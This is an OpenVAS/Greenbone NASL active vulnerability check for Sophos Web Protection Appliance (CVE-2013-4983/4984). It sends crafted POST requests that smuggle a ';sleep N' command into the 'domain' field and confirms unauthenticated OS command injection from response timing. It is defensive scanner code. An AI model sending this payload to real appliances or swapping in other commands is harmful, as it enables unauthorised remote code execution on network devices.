# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sophos:web_appliance";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103781");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2013-09-09 14:28:20 +0200 (Mon, 09 Sep 2013)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2013-4983", "CVE-2013-4984");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Sophos Web Protection Appliance Multiple Vulnerabilities (Jul 2013) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_sophos_web_appliance_http_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("sophos/web_appliance/http/detected");

  script_tag(name:"summary", value:"Sophos Web Protection Appliance is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST requests and checks the responses.");

  script_tag(name:"insight", value:"Sophos Web Protection Appliance is prone to a
  pre-authentication OS command injection vulnerability and to a privilege escalation through local
  OS command injection vulnerability.");

  script_tag(name:"impact", value:"An unauthenticated remote attacker can execute arbitrary OS
  commands on the Sophos appliance with the privileges of the spiderman operating system user.");

  script_tag(name:"affected", value:"Sophos Web Appliance versions 3.7.9 and earlier and 3.8.0
  through 3.8.1 are known to be affected. Other versions might be affected as well.");

  script_tag(name:"solution", value:"Update to version 3.7.9.1, 3.8.1.1 or later.");

  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

host = http_host_name( port:port );

sleep = make_list( 3, 5, 8 );

foreach i( sleep ) {

  ex = "url=aHR0cDovL29wZW52YXMub3JnCg%3d%3d&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo" +
       "&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fexample.org%3bsleep%20" + i +
       "&raw_category_id=one%7ctwo%7cthree%7cfour";

  len = strlen( ex );

  req = 'POST /end-user/index.php?c=blocked&action=continue HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Connection: close\r\n' +
        '\r\n' +
        ex;

  start = unixtime();
  buf = http_keepalive_send_recv( port:port, data:req );
  stop = unixtime();

  if( "example.org" >!< buf )
    exit( 0 );

  if( stop - start < i || stop - start > ( i + 5 ) )
    exit( 99 );
}

report = "The response times indicate that an OS command injection of the 'sleep()` command could be executed.";

security_message( port:port, data:report );

exit( 0 );
